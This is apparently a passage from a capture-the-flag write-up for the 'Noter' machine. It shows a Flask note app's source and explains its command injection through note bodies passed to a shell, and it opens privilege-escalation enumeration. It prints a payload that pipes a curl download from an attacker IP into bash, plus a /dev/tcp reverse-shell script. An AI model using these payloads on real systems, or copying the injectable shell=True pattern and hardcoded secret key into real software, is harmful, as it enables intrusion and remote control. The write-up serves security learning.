          <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"An error occured!"</span><span class="p">)</span>
    
      <span class="k">else</span><span class="p">:</span>
          <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1"># Export local
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_local/&lt;string:id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">export_note_local</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
    
          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes WHERE id = %s and author = %s"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]))</span>
    
          <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
    
              <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
              <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">note</span><span class="p">[</span><span class="s">'body'</span><span class="p">]</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
              <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
            
              <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span> <span class="o">+</span><span class="s">'.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    
          <span class="k">else</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'dashboard.html'</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1"># Export remote
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_remote'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
      <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
    
              <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="n">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    
              <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                  <span class="k">try</span><span class="p">:</span>
                      <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                      <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
                      <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
                      <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
    
                      <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">):</span>
    
                          <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    
                      <span class="k">else</span><span class="p">:</span>
                          <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured while exporting the !"</span><span class="p">)</span>
    
                  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured!"</span><span class="p">)</span>
    
              <span class="k">else</span><span class="p">:</span>
                  <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
                
          <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    
      <span class="k">else</span><span class="p">:</span>
          <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1"># Import notes
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/import_note'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">import_note</span><span class="p">():</span>
    
      <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
          <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'GET'</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'import_note.html'</span><span class="p">)</span>
    
          <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
              <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'title'</span><span class="p">]</span>
              <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
    
              <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="n">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    
              <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                  <span class="k">try</span><span class="p">:</span>
                      <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                      <span class="n">md</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:])</span>
    
                      <span class="n">body</span> <span class="o">=</span> <span class="n">markdown</span><span class="p">.</span><span class="n">markdown</span><span class="p">(</span><span class="n">md</span><span class="p">)</span>
                      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
                      <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"INSERT INTO notes(title, body, author, create_date ) VALUES  (%s, %s, %s ,%s) "</span><span class="p">,</span> <span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="n">body</span><span class="p">[:</span><span class="mi">900</span><span class="p">],</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">],</span> <span class="n">time</span><span class="p">.</span><span class="n">ctime</span><span class="p">()))</span>
                      <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
                      <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
                      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'import_note.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s">"Note imported successfully!"</span><span class="p">)</span>
    
                    
                  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'import_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"An error occured when importing!"</span><span class="p">)</span>
    
              <span class="k">else</span><span class="p">:</span>
                  <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'import_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"An error occured when importing! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    
      <span class="k">else</span><span class="p">:</span>
          <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1"># upgrade to VIP
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/VIP'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">upgrade</span><span class="p">():</span>
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'upgrade.html'</span><span class="p">)</span>
    
  <span class="c1"># note Form Class
</span>  <span class="k">class</span> <span class="nc">NoteForm</span><span class="p">(</span><span class="n">Form</span><span class="p">):</span>
      <span class="n">title</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s">'Title'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">200</span><span class="p">)])</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">TextAreaField</span><span class="p">(</span><span class="s">'Body'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">30</span><span class="p">)])</span>
    
  <span class="c1"># Add note
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/add_note'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">add_note</span><span class="p">():</span>
      <span class="n">form</span> <span class="o">=</span> <span class="n">NoteForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span> <span class="ow">and</span> <span class="n">form</span><span class="p">.</span><span class="n">validate</span><span class="p">():</span>
          <span class="n">title</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">title</span><span class="p">.</span><span class="n">data</span>
          <span class="n">body</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">data</span>
          <span class="c1"># Create Cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
          <span class="c1"># Execute
</span>          <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"INSERT INTO notes(title, body, author,create_date ) VALUES(%s, %s, %s, %s)"</span><span class="p">,(</span><span class="n">title</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">],</span> <span class="n">time</span><span class="p">.</span><span class="n">ctime</span><span class="p">()))</span>
    
          <span class="c1"># Commit to DB
</span>          <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    
          <span class="c1">#Close connection
</span>          <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
          <span class="n">flash</span><span class="p">(</span><span class="s">'note Created'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'dashboard'</span><span class="p">))</span>
    
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add_note.html'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    
  <span class="c1"># Edit note
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/edit_note/&lt;int:id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">edit_note</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="c1"># Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
      <span class="c1"># Get note by id
</span>      <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes WHERE id = %s AND author = %s"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]))</span>
    
      <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
      <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
      <span class="c1"># Get form
</span>      <span class="n">form</span> <span class="o">=</span> <span class="n">NoteForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
    
      <span class="c1"># Populate note form fields
</span>      <span class="n">form</span><span class="p">.</span><span class="n">title</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">note</span><span class="p">[</span><span class="s">'title'</span><span class="p">]</span>
      <span class="n">form</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">note</span><span class="p">[</span><span class="s">'body'</span><span class="p">]</span>
    
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span> <span class="ow">and</span> <span class="n">form</span><span class="p">.</span><span class="n">validate</span><span class="p">():</span>
          <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'title'</span><span class="p">]</span>
          <span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'body'</span><span class="p">]</span>
    
          <span class="c1"># Create Cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
          <span class="n">app</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
          <span class="c1"># Execute
</span>          <span class="n">cur</span><span class="p">.</span><span class="n">execute</span> <span class="p">(</span><span class="s">"UPDATE notes SET title=%s, body=%s WHERE id=%s  AND author = %s"</span><span class="p">,(</span><span class="n">title</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]))</span>
          <span class="c1"># Commit to DB
</span>          <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    
          <span class="c1">#Close connection
</span>          <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
          <span class="n">flash</span><span class="p">(</span><span class="s">'note Updated'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'dashboard'</span><span class="p">))</span>
    
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit_note.html'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    
  <span class="c1"># Delete note
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/delete_note/&lt;int:id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">delete_note</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="c1"># Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
      <span class="c1"># Execute
</span>      <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"DELETE FROM notes WHERE id = %s AND author= %s"</span><span class="p">,(</span><span class="nb">id</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]))</span>
    
      <span class="c1"># Commit to DB
</span>      <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    
      <span class="c1">#Close connection
</span>      <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
      <span class="n">flash</span><span class="p">(</span><span class="s">'Note deleted'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
    
      <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'dashboard'</span><span class="p">))</span>
    
  <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
      <span class="n">app</span><span class="p">.</span><span class="n">secret_key</span><span class="o">=</span><span class="s">'secret123'</span>
      <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">,</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="arbitrary-code-injection">Arbitrary Code Injection</h2>

<p><strong>app.py</strong> used user controllable input (from already created notes or through arbitrary external resources) to build a system command. It is possible to inject arbitrary code in order to affect the expected behavior of the software.</p>

<p>Vulnerable code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_local/&lt;string:id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="o">@</span><span class="n">is_logged_in</span>
<span class="k">def</span> <span class="nf">export_note_local</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes WHERE id = %s and author = %s"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]))</span>
        <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
            <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">note</span><span class="p">[</span><span class="s">'body'</span><span class="p">]</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
            <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span> <span class="o">+</span><span class="s">'.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="p">...</span>

<span class="c1"># Export remote
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_remote'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="o">@</span><span class="n">is_logged_in</span>
<span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
            <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="n">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                    <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
                    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
                    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">):</span>
                        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                   <span class="p">...</span>
</code></pre></div></div>
<p>exploit.md:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">';curl http://10.10.14.3/rev.sh|/bin/bash;'</span>
</code></pre></div></div>

<p>rev.sh:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.3/10099 0&gt;&amp;1'</span>
</code></pre></div></div>

<p><img src="/assets/images/Screenshots/Noter/Untitled%2011.png" alt="Untitled" /></p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<h2 id="local-enumeration">Local enumeration</h2>

<p>Enumerated local users:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh'</span>
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
svc:x:1001:1001:,,,:/home/svc:/bin/bash
</code></pre></div></div>

<p>Enumerated machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:~<span class="nv">$ </span><span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span>
<span class="nv">DISTRIB_ID</span><span class="o">=</span>Ubuntu
<span class="nv">DISTRIB_RELEASE</span><span class="o">=</span>20.04
<span class="nv">DISTRIB_CODENAME</span><span class="o">=</span>focal
<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">"Ubuntu 20.04.3 LTS"</span>
<span class="nv">NAME</span><span class="o">=</span><span class="s2">"Ubuntu"</span>
